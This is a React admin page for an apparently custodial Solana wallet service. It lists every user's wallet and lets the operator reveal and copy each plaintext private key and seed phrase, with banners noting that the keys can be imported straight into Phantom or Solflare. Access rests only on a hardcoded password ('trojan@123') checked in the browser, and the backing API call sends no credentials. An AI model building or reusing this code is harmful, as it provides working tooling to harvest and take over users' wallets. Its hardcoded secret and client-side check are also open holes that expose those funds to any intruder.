"use client"

import { useState, useEffect } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Eye, EyeOff, Copy, Search, Wallet, Key, FileText, Clock, CheckCircle, Lock, AlertCircle } from "lucide-react"

interface WalletData {
  id: string
  publicKey: string
  privateKey: string
  seedPhrase?: string
  userId: number
  walletId: string
  createdAt: any
  lastUsed: any
  storageType: string
  privateKeyFormat?: string
}

export default function WalletAdmin() {
  const [wallets, setWallets] = useState<WalletData[]>([])
  const [filteredWallets, setFilteredWallets] = useState<WalletData[]>([])
  const [searchUserId, setSearchUserId] = useState("")
  const [showPrivateKeys, setShowPrivateKeys] = useState<{ [key: string]: boolean }>({})
  const [loading, setLoading] = useState(false)
  const [copiedKey, setCopiedKey] = useState<string | null>(null)
  const [isAuthenticated, setIsAuthenticated] = useState(false)

  // Handle authentication
  useEffect(() => {
    const password = prompt("Please enter the admin password:")
    if (password === "trojan@123") {
      setIsAuthenticated(true)
    } else {
      alert("Incorrect password. Access denied.")
    }
  }, [])

  const fetchAllWallets = async () => {
    if (!isAuthenticated) return
    setLoading(true)
    try {
      const response = await fetch("/api/admin/wallets")
      const data = await response.json()
      if (data.success) {
        setWallets(data.wallets)
        setFilteredWallets(data.wallets)
      }
    } catch (error) {
      console.error("Error fetching wallets:", error)
    }
    setLoading(false)
  }

  const searchWallets = async () => {
    if (!isAuthenticated) return
    if (!searchUserId) {
      setFilteredWallets(wallets)
      return
    }

    setLoading(true)
    try {
      const response = await fetch(`/api/admin/wallets?userId=${searchUserId}`)
      const data = await response.json()
      if (data.success) {
        setFilteredWallets(data.wallets)
      }
    } catch (error) {
      console.error("Error searching wallets:", error)
    }
    setLoading(false)
  }

  const togglePrivateKey = (walletId: string) => {
    setShowPrivateKeys((prev) => ({
      ...prev,
      [walletId]: !prev[walletId],
    }))
  }

  const copyToClipboard = async (text: string, type: string) => {
    try {
      await navigator.clipboard.writeText(text)
      setCopiedKey(`${type}-${text.substring(0, 10)}`)
      setTimeout(() => setCopiedKey(null), 2000)
    } catch (error) {
      // Fallback for older browsers
      const textArea = document.createElement("textarea")
      textArea.value = text
      document.body.appendChild(textArea)
      textArea.select()
      document.execCommand("copy")
      document.body.removeChild(textArea)
      setCopiedKey(`${type}-${text.substring(0, 10)}`)
      setTimeout(() => setCopiedKey(null), 2000)
    }
  }

  useEffect(() => {
    if (isAuthenticated) {
      fetchAllWallets()
    }
  }, [isAuthenticated])

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-900 p-6 flex items-center justify-center">
        <Card className="bg-slate-800 border-slate-700">
          <CardContent className="text-center py-8">
            <Lock className="h-12 w-12 mx-auto mb-4 text-red-400" />
            <p className="text-white text-lg font-bold">Access Denied</p>
            <p className="text-gray-400 mt-2">Incorrect password. Please refresh the page and try again.</p>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-slate-900 p-6">
      <div className="max-w-7xl mx-auto">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-white mb-2">🔐 Wallet Administration</h1>
          <p className="text-gray-400">View and manage user wallet data (PLAIN TEXT STORAGE)</p>
          <div className="mt-2 p-3 bg-red-900/20 border border-red-500/20 rounded-lg">
            <p className="text-red-400 text-sm">
              ⚠️ <strong>SECURITY WARNING:</strong> All private keys are stored as PLAIN TEXT with NO ENCRYPTION. These
              are IMPORTABLE private keys in Base58 format that can be used directly in wallets.
            </p>
          </div>
        </div>

        {/* Search Section */}
        <Card className="mb-6 bg-slate-800 border-slate-700">
          <CardHeader>
            <CardTitle className="flex items-center text-white">
              <Search className="h-5 w-5 text-blue-400 mr-2" />
              Search Wallets
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex space-x-4">
              <Input
                placeholder="Enter User ID to search..."
                value={searchUserId}
                onChange={(e) => setSearchUserId(e.target.value)}
                className="bg-slate-700 border-slate-600 text-white"
              />
              <Button onClick={searchWallets} disabled={loading} className="bg-blue-600 hover:bg-blue-700">
                {loading ? "Searching..." : "Search"}
              </Button>
              <Button
                onClick={fetchAllWallets}
                disabled={loading}
                variant="outline"
                className="border-slate-600 bg-transparent"
              >
                Show All
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Stats */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
          <Card className="bg-slate-800 border-slate-700">
            <CardContent className="pt-6">
              <div className="flex items-center">
                <Wallet className="h-4 w-4 text-blue-400 mr-2" />
                <span className="text-2xl font-bold text-white">{filteredWallets.length}</span>
              </div>
              <p className="text-gray-400 text-sm">Total Wallets</p>
            </CardContent>
          </Card>

          <Card className="bg-slate-800 border-slate-700">
            <CardContent className="pt-6">
              <div className="flex items-center">
                <Key className="h-4 w-4 text-green-400 mr-2" />
                <span className="text-2xl font-bold text-white">
                  {filteredWallets.filter((w) => w.privateKey).length}
                </span>
              </div>
              <p className="text-gray-400 text-sm">With Private Keys</p>
            </CardContent>
          </Card>

          <Card className="bg-slate-800 border-slate-700">
            <CardContent className="pt-6">
              <div className="flex items-center">
                <FileText className="h-4 w-4 text-purple-400 mr-2" />
                <span className="text-2xl font-bold text-white">
                  {filteredWallets.filter((w) => w.seedPhrase).length}
                </span>
              </div>
              <p className="text-gray-400 text-sm">With Seed Phrases</p>
            </CardContent>
          </Card>

          <Card className="bg-slate-800 border-slate-700">
            <CardContent className="pt-6">
              <div className="flex items-center">
                <Clock className="h-4 w-4 text-yellow-400 mr-2" />
                <span className="text-2xl font-bold text-white">
                  {new Set(filteredWallets.map((w) => w.userId)).size}
                </span>
              </div>
              <p className="text-gray-400 text-sm">Unique Users</p>
            </CardContent>
          </Card>
        </div>

        {/* Wallets List */}
        <div className="space-y-4">
          {filteredWallets.map((wallet) => (
            <Card key={wallet.id} className="bg-slate-800 border-slate-700">
              <CardHeader>
                <div className="flex justify-between items-start">
                  <div>
                    <CardTitle className="text-white flex items-center">
                      <Wallet className="h-5 w-5 text-blue-400 mr-2" />
                      User ID: {wallet.userId}
                    </CardTitle>
                    <CardDescription>
                      Created: {wallet.createdAt?.toDate?.()?.toLocaleString() || "Unknown"}
                    </CardDescription>
                  </div>
                  <div className="flex space-x-2">
                    <Badge variant="outline" className="border-red-500 text-red-400">
                      PLAIN TEXT
                    </Badge>
                    <Badge variant="outline" className="border-green-500 text-green-400">
                      BASE58 IMPORTABLE
                    </Badge>
                    <Badge variant="outline" className="border-blue-500 text-blue-400">
                      #{wallet.walletId?.split("_")[1] || "Unknown"}
                    </Badge>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <Tabs defaultValue="public" className="w-full">
                  <TabsList className="bg-slate-700">
                    <TabsTrigger value="public">Public Info</TabsTrigger>
                    <TabsTrigger value="private">Private Key</TabsTrigger>
                    <TabsTrigger value="seed">Seed Phrase</TabsTrigger>
                    <TabsTrigger value="timestamps">Timestamps</TabsTrigger>
                  </TabsList>

                  <TabsContent value="public" className="space-y-4">
                    <div>
                      <label className="text-gray-400 text-sm">Public Key (Wallet Address)</label>
                      <div className="flex items-center space-x-2 mt-1">
                        <code className="bg-slate-700 p-2 rounded text-white text-sm flex-1 font-mono">
                          {wallet.publicKey}
                        </code>
                        <Button
                          size="sm"
                          onClick={() => copyToClipboard(wallet.publicKey, "public")}
                          className="bg-blue-600 hover:bg-blue-700"
                        >
                          {copiedKey === `public-${wallet.publicKey.substring(0, 10)}` ? (
                            <CheckCircle className="h-4 w-4" />
                          ) : (
                            <Copy className="h-4 w-4" />
                          )}
                        </Button>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-4 mt-4">
                      <div>
                        <span className="text-gray-400 text-sm">Created:</span>
                        <span className="text-white ml-2 block">
                          {wallet.createdAt?.toDate?.()?.toLocaleString() || "Unknown"}
                        </span>
                      </div>
                      <div>
                        <span className="text-gray-400 text-sm">Last Used:</span>
                        <span className="text-white ml-2 block">
                          {wallet.lastUsed?.toDate?.()?.toLocaleString() || "Never"}
                        </span>
                      </div>
                    </div>
                  </TabsContent>

                  <TabsContent value="private" className="space-y-4">
                    <div className="p-4 bg-red-900/20 border border-red-500/20 rounded-lg mb-4">
                      <p className="text-red-400 text-sm">
                        🔥 <strong>IMPORTABLE PRIVATE KEY:</strong> This is the actual private key in Base58 format that
                        you can use to import this wallet into Phantom, Solflare, or any Solana wallet.
                      </p>
                    </div>

                    <div className="p-3 bg-slate-700 rounded-lg mb-4">
                      <div className="flex items-center justify-between">
                        <div>
                          <span className="text-gray-400 text-sm">Private Key Created:</span>
                          <span className="text-yellow-400 ml-2 font-semibold">
                            {wallet.createdAt?.toDate?.()?.toLocaleString() || "Unknown"}
                          </span>
                        </div>
                        <Clock className="h-4 w-4 text-yellow-400" />
                      </div>
                    </div>

                    <div>
                      <label className="text-gray-400 text-sm">Private Key (Base58 - IMPORTABLE FORMAT)</label>
                      <div className="flex items-center space-x-2 mt-1">
                        <code className="bg-slate-700 p-3 rounded text-white text-sm flex-1 font-mono break-all">
                          {showPrivateKeys[wallet.id] ? wallet.privateKey : "•".repeat(88)}
                        </code>
                        <Button
                          size="sm"
                          onClick={() => togglePrivateKey(wallet.id)}
                          variant="outline"
                          className="border-slate-600"
                        >
                          {showPrivateKeys[wallet.id] ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                        </Button>
                        <Button
                          size="sm"
                          onClick={() => copyToClipboard(wallet.privateKey, "private")}
                          className="bg-red-600 hover:bg-red-700"
                        >
                          {copiedKey === `private-${wallet.privateKey.substring(0, 10)}` ? (
                            <CheckCircle className="h-4 w-4" />
                          ) : (
                            <Copy className="h-4 w-4" />
                          )}
                        </Button>
                      </div>
                      <p className="text-green-400 text-xs mt-2">
                        ✅ This format can be directly imported into any Solana wallet
                      </p>
                    </div>
                  </TabsContent>

                  <TabsContent value="seed" className="space-y-4">
                    {wallet.seedPhrase ? (
                      <div>
                        <div className="p-4 bg-purple-900/20 border border-purple-500/20 rounded-lg mb-4">
                          <p className="text-purple-400 text-sm">
                            🔑 <strong>RECOVERY PHRASE:</strong> These 12 words can be used to recover the wallet in any
                            Solana wallet application.
                          </p>
                        </div>

                        <div className="p-3 bg-slate-700 rounded-lg mb-4">
                          <div className="flex items-center justify-between">
                            <div>
                              <span className="text-gray-400 text-sm">Recovery Phrase Created:</span>
                              <span className="text-purple-400 ml-2 font-semibold">
                                {wallet.createdAt?.toDate?.()?.toLocaleString() || "Unknown"}
                              </span>
                            </div>
                            <FileText className="h-4 w-4 text-purple-400" />
                          </div>
                        </div>

                        <label className="text-gray-400 text-sm">Seed Phrase (12 Recovery Words)</label>
                        <div className="flex items-center space-x-2 mt-1">
                          <code className="bg-slate-700 p-3 rounded text-white text-sm flex-1 font-mono">
                            {showPrivateKeys[wallet.id] ? wallet.seedPhrase : "•".repeat(60)}
                          </code>
                          <Button
                            size="sm"
                            onClick={() => togglePrivateKey(wallet.id)}
                            variant="outline"
                            className="border-slate-600"
                          >
                            {showPrivateKeys[wallet.id] ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                          </Button>
                          <Button
                            size="sm"
                            onClick={() => copyToClipboard(wallet.seedPhrase!, "seed")}
                            className="bg-purple-600 hover:bg-purple-700"
                          >
                            {copiedKey === `seed-${wallet.seedPhrase?.substring(0, 10)}` ? (
                              <CheckCircle className="h-4 w-4" />
                            ) : (
                              <Copy className="h-4 w-4" />
                            )}
                          </Button>
                        </div>
                        <p className="text-green-400 text-xs mt-2">✅ Use these 12 words to recover the wallet</p>
                      </div>
                    ) : (
                      <div className="text-gray-400 text-center py-8">
                        <FileText className="h-8 w-8 mx-auto mb-2 opacity-50" />
                        <p>No seed phrase available</p>
                        <p className="text-sm">(Wallet was imported via private key)</p>
                      </div>
                    )}
                  </TabsContent>

                  <TabsContent value="timestamps" className="space-y-4">
                    <div className="p-4 bg-slate-700 rounded-lg">
                      <h3 className="text-white font-semibold mb-4 flex items-center">
                        <Clock className="h-5 w-5 text-blue-400 mr-2" />
                        Detailed Timestamps
                      </h3>

                      <div className="space-y-4">
                        <div className="border-l-4 border-green-500 pl-4">
                          <div className="flex items-center justify-between">
                            <span className="text-gray-400 text-sm">Wallet Created</span>
                            <span className="text-green-400 font-mono text-sm">
                              {wallet.createdAt?.toDate?.()?.toLocaleString() || "Unknown"}
                            </span>
                          </div>
                          <p className="text-gray-500 text-xs mt-1">When the wallet was first generated/imported</p>
                        </div>

                        <div className="border-l-4 border-yellow-500 pl-4">
                          <div className="flex items-center justify-between">
                            <span className="text-gray-400 text-sm">Private Key Stored</span>
                            <span className="text-yellow-400 font-mono text-sm">
                              {wallet.createdAt?.toDate?.()?.toLocaleString() || "Unknown"}
                            </span>
                          </div>
                          <p className="text-gray-500 text-xs mt-1">When the private key was stored in database</p>
                        </div>

                        {wallet.seedPhrase && (
                          <div className="border-l-4 border-purple-500 pl-4">
                            <div className="flex items-center justify-between">
                              <span className="text-gray-400 text-sm">Recovery Phrase Stored</span>
                              <span className="text-purple-400 font-mono text-sm">
                                {wallet.createdAt?.toDate?.()?.toLocaleString() || "Unknown"}
                              </span>
                            </div>
                            <p className="text-gray-500 text-xs mt-1">When the 12-word recovery phrase was stored</p>
                          </div>
                        )}

                        <div className="border-l-4 border-blue-500 pl-4">
                          <div className="flex items-center justify-between">
                            <span className="text-gray-400 text-sm">Last Activity</span>
                            <span className="text-blue-400 font-mono text-sm">
                              {wallet.lastUsed?.toDate?.()?.toLocaleString() || "Never"}
                            </span>
                          </div>
                          <p className="text-gray-500 text-xs mt-1">Last time this wallet was accessed or used</p>
                        </div>

                        <div className="border-l-4 border-red-500 pl-4">
                          <div className="flex items-center justify-between">
                            <span className="text-gray-400 text-sm">Storage Method</span>
                            <span className="text-red-400 font-semibold text-sm">PLAIN TEXT - NO ENCRYPTION</span>
                          </div>
                          <p className="text-gray-500 text-xs mt-1">Security level used for storing sensitive data</p>
                        </div>

                        <div className="border-l-4 border-cyan-500 pl-4">
                          <div className="flex items-center justify-between">
                            <span className="text-gray-400 text-sm">Wallet ID</span>
                            <span className="text-cyan-400 font-mono text-sm">{wallet.walletId || wallet.id}</span>
                          </div>
                          <p className="text-gray-500 text-xs mt-1">Unique identifier for this wallet entry</p>
                        </div>
                      </div>
                    </div>

                    <div className="p-4 bg-amber-900/20 border border-amber-500/20 rounded-lg">
                      <div className="flex items-center mb-2">
                        <AlertCircle className="h-4 w-4 text-amber-400 mr-2" />
                        <span className="text-amber-400 font-semibold">Security Notice</span>
                      </div>
                      <p className="text-amber-300 text-sm">
                        All timestamps show when sensitive data (private keys and recovery phrases) were stored in plain
                        text format. This information is critical for security auditing and compliance.
                      </p>
                    </div>
                  </TabsContent>
                </Tabs>

                <div className="mt-6 pt-4 border-t border-slate-700">
                  <div className="grid grid-cols-2 gap-4 text-sm">
                    <div>
                      <span className="text-gray-400">Last Used:</span>
                      <span className="text-white ml-2">
                        {wallet.lastUsed?.toDate?.()?.toLocaleString() || "Never"}
                      </span>
                    </div>
                    <div>
                      <span className="text-gray-400">Storage:</span>
                      <span className="text-red-400 ml-2 font-bold">PLAIN TEXT - NO ENCRYPTION</span>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>

        {filteredWallets.length === 0 && !loading && (
          <Card className="bg-slate-800 border-slate-700">
            <CardContent className="text-center py-8">
              <Wallet className="h-12 w-12 mx-auto mb-4 text-gray-600" />
              <p className="text-gray-400">No wallets found</p>
              <p className="text-gray-500 text-sm mt-1">Try adjusting your search criteria</p>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
